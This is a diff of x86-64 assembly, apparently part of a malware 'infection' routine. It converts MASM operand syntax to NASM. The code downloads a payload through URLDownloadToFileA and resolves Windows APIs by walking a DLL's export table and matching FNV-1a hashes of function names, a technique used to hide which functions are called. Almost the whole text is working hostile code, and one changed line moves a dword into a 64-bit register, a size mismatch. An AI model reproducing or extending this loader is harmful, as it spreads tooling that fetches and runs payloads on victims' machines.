@@ -68,7 +68,7 @@ infection__data:
    jnz infection__end           ; URLDownloadToFileA returning nonzero is an error
 
 infection__payload_exists:
-   mov dword ptr [rsp+0x28], 1
+   mov dword [rsp+0x28], 1
    xor ecx,ecx
    xor edx,edx
    lea r8, [rbx+(infection__data__sheep-infection__data__start)]
@@ -92,19 +92,19 @@ get_proc_by_hash:
    push rbx
    push rsi
    push rdi
-   movsxd rax, dword ptr [rcx+0x3c] ; e_lfanew
-   mov r8, dword ptr [rax+rcx+0x88] ; nt_headers->OptionalHeader.DataDirectory[IMAGE_EXPORT_DIRECTORY] rva
+   movsxd rax, dword [rcx+0x3c] ; e_lfanew
+   mov r8, dword [rax+rcx+0x88] ; nt_headers->OptionalHeader.DataDirectory[IMAGE_EXPORT_DIRECTORY] rva
    add r8, rcx                      ; pointer to the export directory
    xor r9d, r9d
-   mov r10d, dword ptr [r8+0x20]    ; ExportDirectory.AddressOfNames
+   mov r10d, dword [r8+0x20]    ; ExportDirectory.AddressOfNames
    add r10, rcx
    mov r11, rcx                 ; store the dll in a different register
-   mov edi, dword ptr [r8+0x24] ; ExportDirectory.AddressOfNameOrdinals
+   mov edi, dword [r8+0x24] ; ExportDirectory.AddressOfNameOrdinals
    add rdi, rcx
-   mov esi, dword ptr [r8+0x1C] ; ExportDirectory.AddressOfFunctions
+   mov esi, dword [r8+0x1C] ; ExportDirectory.AddressOfFunctions
    add rsi, rcx
    mov rbx, rdx                 ; store our target hash for later
-   mov r8d, dword ptr [r8+0x18] ; ExportDirectory.NumberOfNames
+   mov r8d, dword [r8+0x18] ; ExportDirectory.NumberOfNames
 
 get_proc_by_hash__name_iter:
    mov eax, [r10]               ; name RVA
@@ -112,7 +112,7 @@ get_proc_by_hash__name_iter:
    mov edx, 0x811c9dc5          ; begin calculating the fnv32-1a hash
 
 get_proc_by_hash__fnv321a:
-   movzx ecx, byte ptr [rax]    ; get the byte of the string
+   movzx ecx, byte [rax]    ; get the byte of the string
    test cl,cl                   ; check for zero
    jz get_proc_by_hash__fnv321a_break ; break on null byte
    
@@ -122,7 +122,7 @@ get_proc_by_hash__fnv321a:
    jmp short get_proc_by_hash__fnv321a
 
 get_proc_by_hash__found_function:
-   movzx ecx, word ptr [rdi+r9*2] ; name_ordinals[name_index]
+   movzx ecx, word [rdi+r9*2] ; name_ordinals[name_index]
    mov eax, [rsi+rcx*4]           ; functions[name_ordinals[name_index]]
    add rax, r11                   ; add the base pointer
    jmp get_proc_by_hash__epilogue ; function found
